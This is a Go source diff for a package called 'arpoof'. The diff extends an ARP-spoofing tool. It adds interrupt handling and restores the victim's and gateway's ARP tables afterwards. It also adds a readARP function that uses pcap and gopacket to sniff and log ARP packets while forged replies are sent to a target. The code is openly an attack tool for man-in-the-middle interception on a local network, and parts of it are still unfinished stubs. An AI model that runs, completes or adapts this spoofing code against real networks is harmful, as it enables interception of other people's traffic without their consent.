@@ -1,10 +1,16 @@
 package arpoof
 
 import (
+	"bytes"
 	"log"
+	"net"
+	"os"
+	"os/signal"
 	"time"
 
 	hdisc "github.com/KennyZ69/HdiscLib"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -30,15 +36,20 @@ func Spoof(target, gateway hdisc.DevData) {
 
 	localDev := &hdisc.DevData{IP: ownIP, Mac: ifi.HardwareAddr}
 
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt)
 	go func() {
-		handleExit(handle, target, gateway)
-		close(stop)
+		for range c {
+			log.Println("Exiting spoofing gracefully ... ")
+			close(stop)
+		}
 	}()
 
-	go readARP()
+	go readARP(handle, stop, ifi)
 
 	<-WriteARPPack(handle, *localDev, target, time.Second*2, stop)
 
+	<-RestoreARPTables(handle, target, gateway)
 	// when there is a signal to stop from writing, continue to return
 	return
 }
@@ -90,4 +101,26 @@ func RestoreARPTables(handle *pcap.Handle, src, victim hdisc.DevData) chan struc
 	return WriteARPPack(handle, src, victim, time.Millisecond*500, stopCh)
 }
 
-func readARP() {}
+func readARP(handle *pcap.Handle, stop chan struct{}, ifi *net.Interface) {
+	ps := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
+	packets := ps.Packets()
+	for {
+		select {
+		case <-stop:
+			return
+		case p := <-packets:
+			arpLayer := p.Layer(layers.LayerTypeARP)
+			if arpLayer == nil {
+				continue
+			}
+			pack := arpLayer.(*layers.ARP)
+			if !bytes.Equal([]byte(ifi.HardwareAddr), pack.SourceHwAddress) {
+				continue
+			}
+			if pack.Operation == layers.ARPReply {
+				// idk
+			}
+			log.Printf("ARP packet (%d): %v (%v) -> %v (%v)\n", pack.Operation, net.IP(pack.SourceProtAddress), net.HardwareAddr(pack.SourceHwAddress), net.IP(pack.DstProtAddress), net.HardwareAddr(pack.DstHwAddress))
+		}
+	}
+}
